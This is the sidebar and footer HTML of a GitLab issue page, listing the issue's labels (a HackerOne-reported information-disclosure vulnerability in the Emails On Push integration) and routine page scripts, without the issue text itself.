<span class="js-sidebar-toggle-container gl-button-text" data-is-expanded="true"><svg class="s16 js-sidebar-expand hidden" data-testid="chevron-double-lg-left-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-left"></use></svg><svg class="s16 js-sidebar-collapse " data-testid="chevron-double-lg-right-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-right"></use></svg></span>

</span>

</button></div>
<form class="issuable-context-form inline-update js-issuable-update " action="/gitlab-org/gitlab/-/issues/337601.json" accept-charset="UTF-8" data-remote="true" method="post"><div class="block assignee gl-mt-3" data-testid="assignee-block-container">
<div class="js-sidebar-assignees-root" data-field="issue" data-max-assignees="200">
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Assignee</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>

</div>
<div class="block epic" data-testid="sidebar-epic">
<div class="js-sidebar-epic-widget-root" data-can-edit="false" data-group-path="gitlab-org" data-issue-id="91412505" data-issue-iid="337601" data-project-path="gitlab-org/gitlab"></div>
</div>

<div class="js-sidebar-labels-widget-root" data-allow-label-create="" data-allow-scoped-labels="true" data-can-edit="" data-iid="337601" data-issuable-type="issue" data-labels-fetch-path="/gitlab-org/gitlab/-/labels.json?include_ancestor_groups=true" data-labels-manage-path="/gitlab-org/gitlab/-/labels" data-project-issues-path="/gitlab-org/gitlab/-/issues" data-project-path="gitlab-org/gitlab" data-selected-labels="[{&quot;id&quot;:12240031,&quot;title&quot;:&quot;Category:Integrations&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Issues related to integrations with 3rd party services. &quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2019-09-26T12:31:52.318Z&quot;,&quot;updated_at&quot;:&quot;2019-09-26T12:31:52.318Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:17851401,&quot;title&quot;:&quot;Integration::EmailsOnPush&quot;,&quot;color&quot;:&quot;#69D100&quot;,&quot;description&quot;:&quot;Issues related to the Emails On Push integration&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2021-01-15T15:44:44.267Z&quot;,&quot;updated_at&quot;:&quot;2021-01-15T15:44:44.267Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:16865576,&quot;title&quot;:&quot;Weakness::CWE-200&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;Information Disclosure&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2020-10-28T22:27:42.311Z&quot;,&quot;updated_at&quot;:&quot;2020-10-28T22:27:42.311Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2677574,&quot;title&quot;:&quot;auto updated&quot;,&quot;color&quot;:&quot;#FFECDB&quot;,&quot;description&quot;:&quot;Issues that have been updated in accordance with our issue triage policies (https://gitlab.com/gitlab-org/gitlab-ce/blob/master/doc/development/contributing/issue_workflow.md)&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2017-09-19T02:09:18.221Z&quot;,&quot;updated_at&quot;:&quot;2019-05-02T11:05:59.557Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2492649,&quot;title&quot;:&quot;backend&quot;,&quot;color&quot;:&quot;#D10069&quot;,&quot;description&quot;:&quot;Issues that require backend work&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-08-15T14:49:42.004Z&quot;,&quot;updated_at&quot;:&quot;2018-06-11T10:34:33.030Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4107753,&quot;title&quot;:&quot;bug::vulnerability&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;A security vulnerability&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-22T15:15:09.960Z&quot;,&quot;updated_at&quot;:&quot;2022-03-16T11:32:16.336Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4116705,&quot;title&quot;:&quot;devops::foundations&quot;,&quot;color&quot;:&quot;#e44d2a&quot;,&quot;description&quot;:&quot;Issues for the Foundations stage of the DevOps lifecycle (e.g. Import \u0026 Integrate, Personal Productivity, etc)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-23T15:35:30.635Z&quot;,&quot;updated_at&quot;:&quot;2024-08-13T17:20:38.144Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:30057931,&quot;title&quot;:&quot;group::import and integrate&quot;,&quot;color&quot;:&quot;#a8d695&quot;,&quot;description&quot;:&quot;Issues, MRs and Epics belong to group::import and integrate https://handbook.gitlab.com/handbook/engineering/development/dev/manage/import-and-integrate/\nresulted from merging group::integrations and group::import | PM: @m_frankiewicz&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2023-04-25T21:26:50.744Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T07:52:00.403Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857529,&quot;title&quot;:&quot;priority::3&quot;,&quot;color&quot;:&quot;#fff600&quot;,&quot;description&quot;:&quot;We want to address this but may have other higher priority items. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-04-13T08:02:52.659Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:23:53.318Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:14918378,&quot;title&quot;:&quot;section::dev&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Issues related to the Dev section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;updated_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:21977643,&quot;title&quot;:&quot;security-backlog::review-complete&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Signifies that this security-backlog issue has been reviewed by an Appsec team member&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-10-04T18:05:29.766Z&quot;,&quot;updated_at&quot;:&quot;2021-10-04T18:06:23.334Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713901,&quot;title&quot;:&quot;severity::3&quot;,&quot;color&quot;:&quot;#fff600&quot;,&quot;description&quot;:&quot;Major - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:22.464Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:12:27.359Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2278648,&quot;title&quot;:&quot;type::bug&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Issues that report undesirable or incorrect behavior. See https://handbook.gitlab.com/handbook/product/groups/product-analysis/engineering/metrics/#work-type-classification&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-07-07T20:20:34.868Z&quot;,&quot;updated_at&quot;:&quot;2024-11-08T09:52:16.699Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:22408318,&quot;title&quot;:&quot;workflow::awaiting security release&quot;,&quot;color&quot;:&quot;#6699cc&quot;,&quot;description&quot;:&quot;This is a security issue that is ready to be deployed but awaiting a security release&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-11-02T16:15:28.794Z&quot;,&quot;updated_at&quot;:&quot;2021-11-02T16:15:28.794Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}]"></div>
<div class="block milestone" data-testid="sidebar-milestones">
<div class="js-sidebar-milestone-widget-root" data-can-edit="" data-issue-iid="337601" data-project-path="gitlab-org/gitlab"></div>
</div>
<div class="block" data-testid="iteration-container"><div class="js-sidebar-iteration-widget-root" data-can-edit="" data-group-path="gitlab-org" data-issue-id="91412505" data-issue-iid="337601" data-project-path="gitlab-org/gitlab"></div>
</div>
<div class="js-sidebar-weight-widget-root" data-can-edit="" data-issue-iid="337601" data-project-path="gitlab-org/gitlab"></div>

<div class="js-sidebar-due-date-widget-root"></div>
<div class="js-sidebar-time-tracking-root block">
<!-- / Fallback while content is loading -->
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Time tracking</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>
<div class="js-sidebar-health-status-widget-root" data-can-edit="" data-full-path="gitlab-org/gitlab" data-iid="337601" data-issuable-type="issue"></div>
<script id="js-confidential-issue-data" type="application/json">{"is_confidential":false,"is_editable":null}</script>
<div class="block">
<div class="hide-collapsed gl-flex gl-items-center gl-font-bold gl-leading-20 gl-text-default">
Confidentiality
</div>
<div class="hide-collapsed gl-text-subtle">
Confidentiality controls have moved to the issue actions menu (<svg class="s12 gl-align-middle" data-testid="ellipsis_v-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#ellipsis_v"></use></svg>) at the top of the page.
</div>
</div>

<div class="js-sidebar-participants-widget-root"></div>
</form><script class="js-sidebar-options" type="application/json">{"endpoint":"/gitlab-org/gitlab/-/issues/337601.json?serializer=sidebar_extras","toggleSubscriptionEndpoint":"/gitlab-org/gitlab/-/issues/337601/toggle_subscription","moveIssueEndpoint":"/gitlab-org/gitlab/-/issues/337601/move","projectsAutocompleteEndpoint":"/-/autocomplete/projects?project_id=278964","editable":"","currentUser":{},"rootPath":"/","fullPath":"gitlab-org/gitlab","iid":337601,"id":91412505,"severity":"unknown","timeTrackingLimitToHours":true,"canCreateTimelogs":null,"createNoteEmail":null,"issuableType":"issue","directlyInviteMembers":"false","weightOptions":["None","Any",0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20],"weightNoneValue":"None","multipleApprovalRulesAvailable":null}</script>
</div>
</aside>



</main>
</div>


</div>
</div>


<script nonce="LZ20jU6qurgypSVWUREQog==">
//<![CDATA[
if ('loading' in HTMLImageElement.prototype) {
  document.querySelectorAll('img.lazy').forEach(img => {
    img.loading = 'lazy';
    let imgUrl = img.dataset.src;
    // Only adding width + height for avatars for now
    if (imgUrl.indexOf('/avatar/') > -1 && imgUrl.indexOf('?') === -1) {
      const targetWidth = img.getAttribute('width') || img.width;
      imgUrl += `?width=${targetWidth}`;
    }
    img.src = imgUrl;
    img.removeAttribute('data-src');
    img.classList.remove('lazy');
    img.classList.add('js-lazy-loaded');
    img.dataset.testid = 'js-lazy-loaded-content';
  });
}

//]]>
</script>
<script nonce="LZ20jU6qurgypSVWUREQog==">
//<![CDATA[
gl = window.gl || {};
gl.experiments = {};


//]]>
</script>

</body>
</html>

